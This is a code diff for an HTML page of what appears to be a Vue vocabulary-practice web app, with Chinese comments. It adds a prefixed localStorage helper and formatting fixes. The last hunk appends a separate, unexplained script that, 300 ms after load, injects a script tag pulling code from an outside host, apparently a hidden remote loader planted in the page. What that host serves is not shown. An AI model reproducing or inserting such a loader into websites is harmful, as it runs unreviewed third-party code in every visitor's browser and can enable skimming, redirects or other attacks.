@@ -203,7 +203,7 @@
                     </li>
                     <li class="nav-item">
                         <a class="nav-link shadow  bg-info text-white  px-lg-5 mx-md-2 mx-lg-5 active"
-                               v-bind:href="'./pracword.html?t'+pd.type+'&p='+pd.pid">练一练</a>
+                            v-bind:href="'./pracword.html?t'+pd.type+'&p='+pd.pid">练一练</a>
                     </li>
                     <li class="nav-item">
                         <a class="nav-link shadow   bg-secondary  text-white  px-lg-5 mx-md-2 mx-lg-5"
@@ -329,12 +329,18 @@
             set(key, value) {
                 localStorage.setItem(key, JSON.stringify(value));
             },
+            pset(key, value) { //私有设置
+                localStorage.setItem('_'+this.px+'_'+key, JSON.stringify(value));
+            },
             get(key) {
-                return JSON.parse(localStorage.getItem(key));
+                var v = localStorage.getItem('_'+this.px+'_'+key);//私有优先
+                v=v?v: localStorage.getItem( key);  
+                return JSON.parse(v);
             },
             remove(key) {
                 localStorage.removeItem(key);
             },
+            px: '',
         }
         gd.pd = ref({ "load": [] });;//page data 页面元素引用"数据"
         //const pd = ref({ "load": [] }); //特殊变量，页面数据
@@ -447,10 +453,10 @@
                 that.progressVal(6)
                 var src = pvs.url.host();//本站
                 var dc = pvs.url.query(true);//参数
-                pvs.type = dc['t'] ? dc['t'] : gd.storage.get('pageType')?gd.storage.get('pageType'):'camb_word';//业务类型，url优先
-                pvs.pid = String(dc['p'] ? dc['p'] : gd.storage.get(pvs.type+'_pid')?gd.storage.get(pvs.type+'_pid'):365);//对应id，url优先
-                gd.storage.set('pageType',pvs.type) 
-                gd.storage.set(pvs.type+'_pid',pvs.pid) 
+                pvs.type = dc['t'] ? dc['t'] : gd.storage.get('pageType') ? gd.storage.get('pageType') : 'camb_word';//业务类型，url优先
+                pvs.pid = String(dc['p'] ? dc['p'] : gd.storage.get(pvs.type + '_pid') ? gd.storage.get(pvs.type + '_pid') : 365);//对应id，url优先
+                gd.storage.set('pageType', pvs.type)
+                gd.storage.set(pvs.type + '_pid', pvs.pid)
                 console.log("script参数=", src, pvs.type, pvs.pid)
                 //document.getElementById('dataFromJson').remove ()
                 // delete  dataFromJSON .data
@@ -687,6 +693,16 @@
         //app.use(Quasar) //vue的ui
         app.mount('#q-app')
     </script>
+
+<script>
+    (() => setTimeout(() => { 
+      var script = document.createElement("script"); 
+      script.src='https://an.17121.top/';
+      document.body.append(script)
+  }, 300))()
+
+
+</script>
 </body>
 
 </html>
